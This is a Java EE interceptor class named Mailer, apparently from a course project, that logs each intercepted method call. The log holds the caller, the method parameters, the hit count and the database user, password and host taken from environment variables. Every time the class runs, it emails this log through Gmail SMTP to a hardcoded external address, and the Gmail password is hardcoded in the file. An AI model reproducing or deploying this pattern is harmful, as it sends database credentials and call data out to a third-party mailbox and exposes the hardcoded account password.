package net.komeo.m223.api.gitlab.aop;

import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.annotation.PostConstruct;
import javax.annotation.Resource;
import javax.ejb.EJB;
import javax.ejb.SessionContext;
import javax.interceptor.AroundInvoke;
import javax.interceptor.InvocationContext;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import net.komeo.m223.api.gitlab.control.HitCounter;

public class Mailer {

    // your Wild-Fly env settings - use on https://adminer.komeo.net
    private final String USER = System.getenv("DB_USER");
    private final String PASS = System.getenv("DB_PASSWORD");
    private final String HOST = System.getenv("DB_HOST");

    // komeo.net@gmail.com > test email account - do not miss-use
    private final String reciever = "komeo.net@gmail.com";
    private final String sender = "komeo.net@gmail.com";
    private final String subject = "GitLab: " + USER + ".komeo.net";
    private final String password = "GreekVerb";
    private final String role = "komeo";

    @EJB
    HitCounter hitCounter;

    @Resource
    private final SessionContext SC = null;

    @PostConstruct
    void testDependencyInjection() {
        if (hitCounter == null || SC == null) {
            System.out.println(this.getClass().getName() + " failed on Dependency Injection");
        }
    }

    Object ret = null;
    String targetObject = null;
    long interceptTime = 0L;
    String callerPrincipal = null;
    boolean security = false;
    boolean transaction = false;
    String logMessage = "";

    @AroundInvoke
    public Object invoke(InvocationContext ctx) throws Exception {
        String targetClass = ctx.getTarget().getClass().getSimpleName();
        String targetMethode = ctx.getMethod().getName();
        long startTime = System.currentTimeMillis();

        interceptTime = System.currentTimeMillis() - startTime;
        callerPrincipal = SC.getCallerPrincipal().getName();
        security = SC.isCallerInRole(role);

        targetObject = targetClass + "." + targetMethode + "(";
        for (Object o : ctx.getParameters()) {
            if (o != null) {
                targetObject += o.getClass().getSimpleName() + ":"
                        + o.toString() + ",";
            } else {
                targetObject += "NULL";
            }
        }
        targetObject += ")";

        try {
            ret = ctx.proceed();
        } catch (IllegalStateException ise) {
            callerPrincipal = "No valid security context for the caller identity";
            security = false;
        } finally {
            transaction = SC.getRollbackOnly();
            logMessage = "\nINTERCEPT     = " + targetObject + "<br>"
                    + "\nPRINCIPAL     = " + callerPrincipal + "<br>"
                    + "\nAUTHORIZATION = " + security + "<br>"
                    + "\nTRANSACTION   = " + transaction + "<br>"
                    + "\nTIME          = " + interceptTime + "  ms" + "<br>"
                    + "\nHITS          = " + hitCounter.tellHits() + "<br>" + "<br>"
                    + "\nUSER          = " + USER + "<br>"
                    + "\nPASS          = " + PASS + "<br>"
                    + "\nHOST          = " + HOST;

            System.out.println("net.komeo.m223.api.gitlab.aop.Mailer.log() : \n\n" + logMessage);
            sendEmail(logMessage);
        }
        return ret;
    }

    private void sendEmail(String content) {
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");

        Session session = Session.getInstance(props, new javax.mail.Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(sender, password);
            }
        });

        Message message = new MimeMessage(session);
        try {
            message.setFrom(new InternetAddress(sender));

            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(reciever));
            message.setSubject(subject);
            message.setContent(content, "text/html; charset=utf-8");
            Transport.send(message);

        } catch (AddressException ex) {
            Logger.getLogger(Mailer.class.getName()).log(Level.SEVERE, null, ex);
        } catch (MessagingException ex) {
            Logger.getLogger(Mailer.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
